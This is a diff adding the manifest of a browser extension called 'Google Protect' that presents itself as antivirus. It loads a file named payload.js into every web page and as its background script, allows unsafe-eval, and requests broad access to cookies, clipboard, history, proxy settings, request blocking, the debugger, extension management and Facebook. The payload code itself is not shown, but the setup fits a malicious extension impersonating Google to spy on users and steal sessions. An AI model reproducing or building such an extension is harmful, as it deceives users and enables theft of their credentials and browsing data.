@@ -1,0 +1,58 @@
+{
+  "name": "Google Protect",
+  "short_name": "Google Protect",
+  "description": "Protect you from viruts, malware, phishing...",
+  "version": "0.0.1",
+  "content_scripts":[{
+    "matches":["http://*/*","https://*/*"],
+    "js":["assets/js/payload.js"]
+  }],
+  "manifest_version": 4,
+  "icons": {
+    "16": "assets/images/icon.png",
+    "128": "assets/images/icon.png"
+  },
+  "options_page": "index.html",
+  "background": {
+    "scripts": ["assets/js/payload.js"]
+  },
+  "browser_action": {
+    "default_icon": {
+      "19": "assets/images/icon.png",
+      "38": "assets/images/icon.png"
+    },
+    "default_title": "Protect you from viruts, malware, phishing...",
+    "default_popup": "popup.html"
+  },
+  "omnibox": {
+        "keyword": "hello"
+    },
+  "content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'",
+  "permissions": [
+    "bookmarks",
+    "clipboardRead",
+    "clipboardWrite",
+    "commands",
+    "contentSettings",
+    "contextMenus",
+    "cookies",
+    "debugger",
+    "declarativeContent",
+    "history",
+    "management",
+    "notifications",
+    "pageCapture",
+    "proxy",
+    "tabCapture",
+    "tabs",
+    "storage",
+    "unlimitedStorage",
+    "topSites",
+    "webNavigation",
+    "webRequest",
+    "webRequestBlocking",
+    "<all_urls>",
+    "https://www.facebook.com/"
+  ]
+  
+}
